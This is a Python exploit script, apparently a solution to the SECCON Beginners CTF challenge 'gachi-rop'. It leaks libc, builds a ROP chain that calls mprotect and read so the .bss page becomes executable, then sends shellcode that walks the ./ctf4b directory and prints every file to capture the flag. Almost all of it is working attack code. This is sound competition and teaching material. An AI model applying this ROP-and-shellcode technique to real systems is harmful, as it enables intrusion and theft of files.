import os
from ptrlib import *

assert os.path.exists("./gachi-rop"), "./gachi-rop not found ;("
assert os.path.exists("./libc.so.6"), "./libc.so.6 not found ;("

elf = ELF("./gachi-rop")
libc = ELF("./libc.so.6")

sock = Socket("nc gachi-rop.beginners.seccon.games 4567")
# sock = Process("./gachi-rop")
# sock.debug = True

sock.recvuntil("system@")
libc.base = int(sock.recvline(), 16) - libc.symbol("system")

sock.recvuntil("Name: ")
payload = b"A" * 0x18
# mprotect(0x404000, 0x1000, 0x7)
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(elf.section(".bss") & ~0xFFF)
payload += p64(next(libc.gadget("pop rsi; ret;")))
payload += p64(0x1000)
payload += p64(next(libc.gadget("pop rdx; pop r12; ret;")))
payload += p64(0x7)
payload += p64(0x0)  # X
payload += p64(libc.symbol("mprotect"))
# read(0x0, bss + 0x100, 0x200)
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(0x0)
payload += p64(next(libc.gadget("pop rsi; ret;")))
payload += p64(elf.section(".bss") + 0x100)
payload += p64(next(libc.gadget("pop rdx; pop r12; ret;")))
payload += p64(0x200)
payload += p64(0x0)  # X
payload += p64(libc.symbol("read"))
# jmp bss + 0x100
payload += p64(next(libc.gadget("pop rax; ret;")))
payload += p64(elf.section(".bss") + 0x100)
payload += p64(next(libc.gadget("jmp rax;")))
sock.sendline(payload)

shellcode = nasm(
    f"""
    xor esi, esi
    lea rdi, [rel ctf4b]
    mov eax, {syscall.x64.open}
    syscall
    mov r13, rax
    cld

loop:
    mov edx, 0x40
    lea rsi, [rel buf]
    mov rdi, r13
    mov eax, {syscall.x64.getdents}
    syscall
    test eax, eax
    jz end

    mov dword [rel buf + 18 - 8], './ct'
    mov dword [rel buf + 18 - 4], 'f4b/'

    xor esi, esi
    lea rdi, [rel buf + 18 - 8]
    mov eax, {syscall.x64.open}
    syscall

    mov edx, 0x100
    lea rsi, [rel buf]
    mov edi, eax
    mov eax, {syscall.x64.read}
    syscall
    test rax, rax
    jle loop

    mov edx, eax
    mov edi, 1
    mov eax, {syscall.x64.write}
    syscall
    
    jmp loop

end:
    xor edi, edi
    mov eax, {syscall.x64.exit_group}
    syscall

ctf4b: db "./ctf4b", 0
buf:
""",
    bits=64,
)
sock.sendline(shellcode)

flag = sock.recvregex("ctf4b{.*?}")
print(flag.decode())
# sock.sh()
